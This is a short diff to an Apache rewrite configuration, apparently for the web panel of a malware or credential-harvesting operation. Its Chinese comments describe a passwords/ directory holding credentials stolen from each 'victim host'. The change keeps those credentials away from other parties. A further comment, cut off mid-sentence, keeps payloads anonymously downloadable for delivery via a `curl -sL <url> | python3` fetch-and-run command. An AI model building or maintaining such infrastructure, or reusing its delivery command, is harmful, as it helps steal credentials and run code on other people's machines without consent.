@@ -25,6 +25,12 @@ RewriteEngine On
     RewriteRule ^includes/ - [F,L]
     RewriteRule ^database/ - [F,L]
     RewriteRule ^templates/ - [F,L]
+    # passwords/ 此前漏了 —— 而它恰恰是最不该公开的目录。
+    # 它存的是每台受害主机的凭据，.flora 又不在下面的扩展名黑名单里，
+    # 于是 `GET /passwords/<主机>_<用户>/<时间>_<id>.flora` 免登录就能拿到。
+    # 实测：:8080 上未带任何 Cookie 返回 HTTP 200 + 24 字节口令明文。
+    # 正规入口是需登录的 download_file.php（它直接读文件系统，不受本规则影响）。
+    RewriteRule ^passwords/ - [F,L]
 
     # 生成的载荷必须可匿名下载 —— 投放方式是 `curl -sL <url> | python3`，
     # 受害机器上没有会话可登录。载荷本身是明文脚本，拿到它就等于拿到里面的
